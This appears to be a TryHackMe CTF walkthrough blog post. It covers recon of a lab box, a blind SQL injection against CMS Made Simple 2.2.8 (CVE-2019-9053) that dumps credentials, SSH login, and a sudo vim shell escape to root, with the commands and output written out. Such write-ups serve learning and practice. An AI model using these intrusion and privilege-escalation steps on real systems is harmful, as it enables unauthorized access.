---
layout: post
title: "Simple CTF - TryHackMe CTF Writeup"
date: 2026-09-11
description: "A beginner box with a decoy - nmap recon, an OpenEMR rabbit hole, blind SQLi on CMS Made Simple, and sudo vim for root."
tags: [tryhackme, ctf, simple-ctf, sqli, privesc]
author: zew0z
---

# Simple CTF - TryHackMe CTF

Beginner-level room, but it still managed to send me down a genuinely convincing rabbit hole before the real path showed up. SQL injection for credentials, then a textbook vim privesc.
Note: like always, I'm leaving the actual flags and passwords out of this writeup so I don't spoil the room for anyone.
[Link for the CTF](https://tryhackme.com/room/simplectf)

---

## Recon

Straight nmap with version detection:

```text
zero ❯ nmap -sV <machine-ip>
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

Three ports, and note the SSH port: **2222**, not 22. That matters later.

I also fumbled one of the first questions by not reading it properly. "How many services are running under port 1000?" - I saw the port 1000 scan in my notes and answered for that, got rejected, reread the question, and counted what was actually there: two (FTP and HTTP). SSH sits above. Reading comprehension: still a hackability skill.

## The OpenEMR Rabbit Hole

Port 80 serves the default Apache page, so next stop is `robots.txt`:

![](/assets/img/simple-ctf/thm-simplectf-robots-txt.png)

One juicy-looking entry: `Disallow: /openemr-5_0_1_3`. A versioned path for a medical records system with known CVEs? That smells like the room's whole point.

Except:

![](/assets/img/simple-ctf/thm-simplectf-openemr-404.png)

404. The path doesn't exist. And here's where I lost some time: instead of accepting that, I went and researched OpenEMR 5.0.1.3 exploits anyway, because the robots.txt entry was *so* specific:

![](/assets/img/simple-ctf/thm-simplectf-openemr-exploitdb.png)

Found exploits, read CVE writeups, connected exactly nothing. The lesson landed only after I stopped believing robots.txt and let **gobuster** tell me what's actually served:

```text
zero ❯ gobuster dir --wordlist=/usr/share/seclists/Discovery/Web-Content/big.txt --url http://<machine-ip>
robots.txt           (Status: 200) [Size: 929]
simple               (Status: 301) [--> http://<machine-ip>/simple/]
```

`/simple/` - that's the real door. robots.txt was a decoy the whole time.

## SQLi on CMS Made Simple

![](/assets/img/simple-ctf/thm-simplectf-cms-homepage.png)

`/simple/` is **CMS Made Simple 2.2.8** with the News module installed (the footer helpfully says "Posted by: mitch" - remember that name). Version numbers are for looking up: CMS Made Simple 2.2.8 has **CVE-2019-9053**, an unauthenticated blind time-based SQL injection through the News module's `m1_idlist` parameter. Public exploit as EDB-ID 46635:

![](/assets/img/simple-ctf/thm-simplectf-cms-exploitdb.png)

Two fails before it worked, both worth documenting:

**Fail 1: the exploit is Python 2.**

```text
zero ❯ python3 cve-2019-9053.py
  File "cve-2019-9053.py", line 63
    print "\033c"
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

The original EDB exploit predates Python 3. I started hand-patching it, then remembered other people exist and pulled a Python 3 port instead.

**Fail 2: empty results.** The ported script ran clean but returned nothing:

```text
[+] Salt for password found:
[+] Username found:
[+] Email found:
[+] Password found:
```

Everything empty usually means the injection never hit the app. My `-u` argument was the bare IP - the script needed the full app path, `http://<machine-ip>/simple`. One flag change later, the blind injection started dumping:

```text
[+] Salt for password found: (redacted)
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: (redacted)
[+] Password cracked: (redacted)
```

Salt, username, password hash, and a cracked plaintext, straight out of a time-based injection. The actual credentials stay redacted here like everything else - the fun is running the exploit yourself.

## Shell and Root

The admin portal at `/simple/admin/` accepted the cracked login:

![](/assets/img/simple-ctf/thm-simplectf-admin.png)

But CMS admin rights aren't the win here - the room wants a shell, and the credentials also work for that SSH service on port **2222**:

```text
zero ❯ ssh mitch@<machine-ip> -p 2222
mitch@<machine-ip>'s password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

$ ls
user.txt
$ cat user.txt
```

User flag captured (not printed here). A quick look around found a second home directory for a user named `sunbath` - one of those details that exists purely to answer a room question, as far as I could tell.

Privilege escalation, the usual opening moves:

```text
$ find / -user root -perm /4000 2>/dev/null
/bin/su
/bin/ping
/usr/bin/passwd
...
```

Nothing unusual in the SUID list. So, `sudo -l` - always `sudo -l`:

```text
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Vim as root, no password. GTFOBins writes itself:

```text
$ sudo vim
:!bash
# whoami
root
# cat /root/root.txt
```

Root, second flag, room done.

## What I Learned

- `robots.txt` entries can be **decoys** - a 404 means it's not real, no matter how specific the path looks. Gobuster is the ground truth
- Public exploits are frequently Python 2; check before you run, and search for a maintained port before hand-patching
- When an exploit returns empty everything, audit **your own arguments** first - a missing base path was my whole problem
- `sudo -l` is the highest-value one-liner in privilege escalation, and vim with NOPASSWD is an instant root shell (`:!bash`)
- Services on non-standard ports (SSH on 2222) are still just that service - scan high ports properly

---

**If you're trying this room too and get stuck, feel free to DM me or just throw commands at the wall like I did - eventually something sticks.**
